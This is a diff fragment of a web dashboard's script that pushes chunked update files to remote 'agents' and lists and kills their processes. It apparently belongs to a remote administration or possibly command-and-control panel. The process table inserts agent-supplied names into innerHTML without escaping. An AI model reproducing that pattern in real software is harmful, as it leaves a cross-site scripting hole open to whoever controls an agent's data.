+    document.getElementById('agent-update-input').onchange = (e) => {
+        const file = e.target.files[0];
+        if (!file || !system_active_agent) return;
+        addResponse('Server', `Starting update for ${system_active_agent} with ${file.name}`);
+        const reader = new FileReader(), transfer_id = `update_${Date.now()}`;
+        let offset = 0;
+        reader.onload = (ev) => {
+            socket.emit('agent_update_chunk_from_web', {
+                target: system_active_agent, transfer_id,
+                chunk: ev.target.result, final: (offset + ev.target.result.byteLength) >= file.size
+            });
+            offset += ev.target.result.byteLength;
+            if (offset < file.size) readNextChunk();
+            else { addResponse('Server', `Finished sending ${file.name} to agent(s). Waiting for restart...`) }
+        };
+        const readNextChunk = () => reader.readAsArrayBuffer(file.slice(offset, offset + FILE_CHUNK_SIZE));
+        readNextChunk();
+        e.target.value = '';
+    };
+
+    socket.on('system_response_to_web', (data) => {
+        if (data.agent_id === system_active_agent && data.command === 'process_list') {
+            const processes = data.processes.sort((a,b) => (b.cpu_percent || 0) - (a.cpu_percent || 0));
+            let html = '<table class="data-table"><tr><th>PID</th><th>Name</th><th>User</th><th>CPU %</th><th>Memory (MB)</th><th style="text-align:right">Action</th></tr>';
+            processes.forEach(p => {
+                html += `<tr><td>${p.pid}</td><td>${p.name}</td><td>${p.username||'N/A'}</td><td>${(p.cpu_percent||0).toFixed(2)}</td><td>${p.memory_mb.toFixed(2)}</td><td style="text-align:right"><button class="action-btn" onclick="killProcess(${p.pid})" title="Kill"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line></svg></button></td></tr>`;
+            });
+            procListContainer.innerHTML = html + '</table>';
+        }
+    });
+
+    updateAllButtons(); // Initial state
+</script>
+</body>
+</html>
